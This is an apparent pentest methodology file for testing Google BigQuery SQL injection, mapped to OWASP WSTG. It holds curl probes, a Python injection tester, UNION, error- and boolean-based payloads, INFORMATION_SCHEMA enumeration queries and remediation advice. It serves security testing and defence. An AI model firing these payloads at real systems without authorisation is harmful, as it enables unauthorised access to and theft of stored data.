---
name: wstg-inpv-05.9
description: "Testing for SQL Injection - Google BigQuery"
category: input-validation
owasp_id: WSTG-INPV-05.9
version: "1.0.0"
author: cyberstrike-official
tags: [injection, input-validation, sqli, wstg, inpv, bigquery, gcp, cloud]
tech_stack: [bigquery, gcp]
cwe_ids: [CWE-89]
chains_with: [wstg-inpv-01, wstg-inpv-02]
prerequisites: [wstg-conf-01, wstg-conf-02]
severity_boost:
  wstg-inpv-02: "BigQuery Injection reaching a dataset with write/append scope allows crafting attacker-controlled string values that are later rendered unsanitized in a reporting/BI dashboard, achieving persistent Stored XSS against every analyst who views the report = Critical (Analyst/Admin Account Compromise)"
---

# wstg-inpv-05.9

## Test ID

WSTG-INPV-05.9

## Test Name

Testing for SQL Injection - Google BigQuery

## High-Level Description

Google BigQuery SQL Injection is a vulnerability class where an attacker can execute arbitrary GoogleSQL (BigQuery Standard SQL) statements on a BigQuery dataset by manipulating user input that is concatenated unsanitized into a query. BigQuery is common in analytics/BI backends, data pipelines, and serverless applications built on GCP. Unlike classic RDBMS engines, BigQuery has no native `SLEEP()`/time-delay function, so purely time-based blind exploitation is not viable — testing must lean on boolean-based blind, error-based, and UNION-based techniques instead. BigQuery's fully-qualified table references (`` `project_id.dataset_name.table_name` `` using backticks) and its `INFORMATION_SCHEMA` views are the primary enumeration surface once injection is confirmed.

---

## What to Check

- [ ] Single-quote (`'`) triggers a GoogleSQL syntax error
- [ ] Backtick-quoted table reference (`` `project.dataset.table` ``) is reflected/echoed in errors, confirming BigQuery as backend
- [ ] `@@project_id` system variable is queryable (confirms injection context can execute arbitrary expressions)
- [ ] `INFORMATION_SCHEMA.SCHEMATA` / `INFORMATION_SCHEMA.TABLES` accessible for dataset/table enumeration
- [ ] UNION-based injection into `GROUP BY` / subquery contexts
- [ ] Error-based extraction via division-by-zero or `CAST(... AS INT64)` type errors
- [ ] Boolean-based blind via `SUBSTRING()` comparisons
- [ ] Time-based blind is **not applicable** — do not waste cycles on `SLEEP()`-style payloads against BigQuery
- [ ] `#` and `/* */` comment injection to truncate trailing query fragments
- [ ] IAM/service-account scope on the querying identity (determines blast radius: read-only vs. dataset write/export)

---

## How to Test

### Step 1: BigQuery Detection

```bash
#!/bin/bash
TARGET="https://target.com/report?column="

echo "[*] Testing for Google BigQuery backend..."

# Single-quote error trigger
curl -s "${TARGET}'" | grep -iE "Syntax error|Unrecognized name|INFORMATION_SCHEMA|BigQuery|googleapis"

# Backtick table notation is unique to BigQuery/GoogleSQL - reflected errors often echo it
curl -s "${TARGET}\`" | grep -iE "Syntax error: Unexpected|Encountered .*\`"

# Confirm arbitrary expression execution via system variable
curl -s "${TARGET}(SELECT @@project_id)"

# Confirm INFORMATION_SCHEMA reachability
curl -s "${TARGET}(SELECT schema_name FROM INFORMATION_SCHEMA.SCHEMATA)"

# Hash comment to truncate trailing query
curl -s "${TARGET}1#"
```

### Step 2: BigQuery SQLi Tester

```python
#!/usr/bin/env python3
"""
Google BigQuery SQL Injection Tester
"""

import requests
import re

class BigQuerySQLiTester:
    def __init__(self, url):
        self.url = url
        self.findings = []
        self.session = requests.Session()

    # BigQuery / GoogleSQL error patterns
    BIGQUERY_ERRORS = [
        r"Syntax error: Unexpected",
        r"Unrecognized name:",
        r"INFORMATION_SCHEMA",
        r"googleapis\.com",
        r"BigQuery",
        r"No matching signature for",
        r"Query error:",
        r"Encountered \" *\" at line",
    ]

    # BigQuery-specific payloads
    BIGQUERY_PAYLOADS = {
        'detection': [
            "'",
            "`",
            "(SELECT @@project_id)",
            "(SELECT schema_name FROM INFORMATION_SCHEMA.SCHEMATA)",
        ],
        'union_based': [
            "UNION ALL SELECT (SELECT @@project_id),1,1,1,1,1,1)) AS T1 GROUP BY column_name#",
            "true) GROUP BY column_name LIMIT 1 UNION ALL SELECT (SELECT 'asd'),1,1,1,1,1,1)) AS T1 GROUP BY column_name#",
            "true) GROUP BY column_name LIMIT 1 UNION ALL SELECT (SELECT @@project_id),1,1,1,1,1,1)) AS T1 GROUP BY column_name#",
            "' GROUP BY column_name UNION ALL SELECT column_name,1,1 FROM  (select column_name AS new_name from `project_id.dataset_name.table_name`) AS A GROUP BY column_name#",
        ],
        'error_based': [
            "' OR if(1/(length((select('a')))-1)=1,true,false) OR '",
            "select CAST(@@project_id AS INT64)",
        ],
        'boolean_based': [
            "' WHERE SUBSTRING((select column_name from `project_id.dataset_name.table_name` limit 1),1,1)='A'#",
        ],
        # No native SLEEP()/time-delay function in BigQuery - time-based blind is not viable
        'time_based': [],
    }

    def detect_bigquery(self, param):
        """Detect if backend is Google BigQuery"""
        print(f"[*] Detecting BigQuery database...")

        for payload in self.BIGQUERY_PAYLOADS['detection']:
            try:
                response = self.session.get(self.url, params={param: payload})

                for pattern in self.BIGQUERY_ERRORS:
                    if re.search(pattern, response.text, re.IGNORECASE):
                        print(f"[+] BigQuery database detected!")
                        return True

            except Exception:
                pass

        return False

    def test_error_based(self, param):
        """Test BigQuery error-based injection"""
        print(f"\n[*] Testing BigQuery error-based injection...")

        for payload in self.BIGQUERY_PAYLOADS['error_based']:
            try:
                response = self.session.get(self.url, params={param: payload})

                if re.search(r"division by zero|No matching signature for|CAST", response.text, re.IGNORECASE):
                    print(f"[VULN] Error-based SQLi!")
                    self.findings.append({
                        'type': 'BigQuery Error-based SQLi',
                        'payload': payload,
                        'severity': 'Critical'
                    })
                    return True

            except Exception:
                pass

        return False

    def test_union_based(self, param):
        """Test BigQuery UNION-based injection"""
        print(f"\n[*] Testing BigQuery UNION-based injection...")

        for payload in self.BIGQUERY_PAYLOADS['union_based']:
            try:
                response = self.session.get(self.url, params={param: payload})

                if response.status_code == 200 and 'error' not in response.text.lower():
                    print(f"[POSSIBLE VULN] UNION-based SQLi - manual verification required")
                    self.findings.append({
                        'type': 'BigQuery UNION-based SQLi (candidate)',
                        'payload': payload,
                        'severity': 'High'
                    })

            except Exception:
                pass

        return False

    def test_boolean_based(self, param):
        """Test BigQuery boolean-based blind injection"""
        print(f"\n[*] Testing BigQuery boolean-based blind injection...")

        true_payload = "' AND 1=1#"
        false_payload = "' AND 1=2#"

        try:
            r_true = self.session.get(self.url, params={param: true_payload})
            r_false = self.session.get(self.url, params={param: false_payload})

            if r_true.text != r_false.text or r_true.status_code != r_false.status_code:
                print(f"[VULN] Boolean-based blind SQLi!")
                self.findings.append({
                    'type': 'BigQuery Boolean-based Blind SQLi',
                    'payload': f"{true_payload} vs {false_payload}",
                    'severity': 'High'
                })
                return True

        except Exception:
            pass

        return False

    def run_tests(self, param='column'):
        """Run all BigQuery SQLi tests"""
        if self.detect_bigquery(param):
            self.test_error_based(param)
            self.test_union_based(param)
            self.test_boolean_based(param)
            # Time-based blind intentionally skipped: BigQuery has no SLEEP()/time-delay function

        self.generate_report()

    def generate_report(self):
        """Generate findings report"""
        print("\n" + "="*60)
        print("GOOGLE BIGQUERY SQL INJECTION REPORT")
        print("="*60)

        if not self.findings:
            print("\nNo BigQuery SQLi vulnerabilities found.")
        else:
            for f in self.findings:
                print(f"\n[{f['severity']}] {f['type']}")
                if 'payload' in f:
                    print(f"  Payload: {f['payload'][:90]}")

# Usage
tester = BigQuerySQLiTester("https://target.com/report")
tester.run_tests(param='column')
```

### Step 3: BigQuery Data Enumeration

```sql
-- Current project id
SELECT @@project_id

-- List all dataset (schema) names in the current project
SELECT schema_name FROM INFORMATION_SCHEMA.SCHEMATA

-- List tables within a known dataset
SELECT table_name FROM `project_id.dataset_name`.INFORMATION_SCHEMA.TABLES

-- List columns of a known table
SELECT column_name FROM `project_id.dataset_name`.INFORMATION_SCHEMA.COLUMNS WHERE table_name='table_name'

-- Direct read from a discovered fully-qualified table
select * from project_id.dataset_name.table_name

-- Error-based division-by-zero oracle (used to smuggle a boolean condition into an error)
' OR if(1/(length((select('a')))-1)=1,true,false) OR '

-- Type-cast error oracle
select CAST(@@project_id AS INT64)
```

---

## Tools

| Tool                | Purpose                                          |
| -------------------- | ------------------------------------------------ |
| Burp Suite           | Manual request tampering / repeater              |
| bq CLI               | Authenticated BigQuery client (post-exploitation) |
| curl                 | Manual payload delivery                           |
| Google Cloud Console | Verify IAM scope / dataset permissions of the querying service account |

Note: SQLMap does not have a dedicated BigQuery `--dbms` fingerprint; BigQuery testing is predominantly manual due to the absence of time-based oracles and the non-standard `INFORMATION_SCHEMA` addressing (dataset-scoped, not global).

---

## Example Commands/Payloads

### Detection (curl)

```bash
TARGET="https://target.com/report"

# Syntax error trigger
curl -s "$TARGET?column=1'" | grep -Ei "Syntax error|Unrecognized name|INFORMATION_SCHEMA"

# Confirm backend identity and enumerate project
curl -s "$TARGET?column=(SELECT @@project_id)"

# Enumerate datasets
curl -s "$TARGET?column=(SELECT schema_name FROM INFORMATION_SCHEMA.SCHEMATA)"
```

### BigQuery Comment Syntax

| Type                       | Description     |
| --------------------------- | ---------------- |
| `#`                          | Hash comment     |
| `/* comment */`              | C-style comment  |

### BigQuery Union Based

```sql
UNION ALL SELECT (SELECT @@project_id),1,1,1,1,1,1)) AS T1 GROUP BY column_name#
true) GROUP BY column_name LIMIT 1 UNION ALL SELECT (SELECT 'asd'),1,1,1,1,1,1)) AS T1 GROUP BY column_name#
true) GROUP BY column_name LIMIT 1 UNION ALL SELECT (SELECT @@project_id),1,1,1,1,1,1)) AS T1 GROUP BY column_name#
' GROUP BY column_name UNION ALL SELECT column_name,1,1 FROM  (select column_name AS new_name from `project_id.dataset_name.table_name`) AS A GROUP BY column_name#
```

### BigQuery Error Based

| SQL Query                                                | Description      |
| --------------------------------------------------------- | ------------------ |
| `' OR if(1/(length((select('a')))-1)=1,true,false) OR '`  | Division by zero   |
| `select CAST(@@project_id AS INT64)`                       | Casting            |

### BigQuery Boolean Based

```sql
' WHERE SUBSTRING((select column_name from `project_id.dataset_name.table_name` limit 1),1,1)='A'#
```

### BigQuery Time Based

Time-based functions (`SLEEP()` and equivalents) **do not exist** in the BigQuery SQL dialect — do not attempt time-based blind extraction against a BigQuery backend; use boolean-based blind or error-based instead.

### Detection Pattern

| Signal | Meaning |
| ------ | ------- |
| `Syntax error: Unexpected` / `Unrecognized name:` in response | Error-based SQLi, confirms GoogleSQL/BigQuery backend |
| Backtick-quoted identifier echoed in an error | Confirms BigQuery's `` `project.dataset.table` `` addressing model is in play |
| `@@project_id` value reflected | Injection point executes arbitrary expressions, confirms exploitability |
| Division-by-zero / `CAST(... AS INT64)` error toggles with condition | Error-based boolean oracle available for blind extraction |
| Response body/length differs between `AND 1=1#` and `AND 1=2#` | Boolean-based blind SQLi |
| No response delay difference for any injected delay payload | Expected — BigQuery has no time-delay primitive, not a sign of no vulnerability |

---

## Remediation

```python
# Python - google-cloud-bigquery parameterized query
from google.cloud import bigquery

client = bigquery.Client()
query = "SELECT * FROM `project.dataset.table` WHERE id = @id"
job_config = bigquery.QueryJobConfig(
    query_parameters=[bigquery.ScalarQueryParameter("id", "STRING", user_id)]
)
client.query(query, job_config=job_config)
```

```javascript
// Node.js - @google-cloud/bigquery parameterized query
const { BigQuery } = require("@google-cloud/bigquery")
const bigquery = new BigQuery()

const query = "SELECT * FROM `project.dataset.table` WHERE id = @id"
const options = {
  query: query,
  params: { id: userId },
}
await bigquery.query(options)
```

Additional hardening:
- Never build fully-qualified table/dataset identifiers (`` `project.dataset.table` ``) from unsanitized user input — allowlist identifiers against a fixed set instead of concatenating.
- Apply least-privilege IAM roles (`roles/bigquery.dataViewer` / `bigquery.jobUser`) to the service account executing user-facing queries; avoid `bigquery.dataEditor`/`bigquery.admin` on request-serving paths.
- Enable BigQuery audit logs and alert on anomalous `INFORMATION_SCHEMA` access patterns from application service accounts.

---

## Risk Assessment

| Finding                                   | CVSS | Severity |
| ------------------------------------------ | ---- | -------- |
| BigQuery SQLi with dataset write/export scope | 9.1  | Critical |
| BigQuery UNION-based data exfiltration        | 8.6  | High     |
| BigQuery Boolean/Error-based Blind SQLi       | 7.5  | High     |

---

## CWE Categories

| CWE ID     | Title         |
| ---------- | ------------- |
| **CWE-89** | SQL Injection |

---

## References

- [OWASP WSTG - Testing for SQL Injection (WSTG-INPV-05)](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/05-Testing_for_SQL_Injection)
- [PayloadsAllTheThings - BigQuery Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/BigQuery%20Injection.md)
- [BigQuery SQL Injection Cheat Sheet - Ozgur Alp](https://web.archive.org/web/20260222133721/https://ozguralp.medium.com/bigquery-sql-injection-cheat-sheet-65ad70e11eac)
- [BigQuery Documentation - Query Syntax](https://web.archive.org/web/20251109151650/https://cloud.google.com/bigquery/docs/reference/standard-sql/query-syntax)
- [BigQuery Documentation - Functions and Operators](https://web.archive.org/web/20170524193028/https://cloud.google.com/bigquery/docs/reference/standard-sql/functions-and-operators)
- [Akamai WAF Bypass Journey: Exploiting Google BigQuery SQL Injection - Duc Nguyen](https://web.archive.org/web/20260225150843/https://hackemall.live/index.php/2020/03/31/akamai-web-application-firewall-bypass-journey-exploiting-google-bigquery-sql-injection-vulnerability/)

---

## Checklist

```
[ ] BigQuery database detected (single-quote / backtick error, INFORMATION_SCHEMA reachable)
[ ] @@project_id and dataset/table enumeration confirmed
[ ] Comment syntax (# and /* */) confirmed for query truncation
[ ] UNION-based injection tested
[ ] Error-based injection tested (division by zero, CAST AS INT64)
[ ] Boolean-based blind injection tested
[ ] Time-based blind explicitly skipped/documented (not supported by BigQuery)
[ ] IAM scope of querying service account documented (read-only vs. write/export)
[ ] Findings documented
```
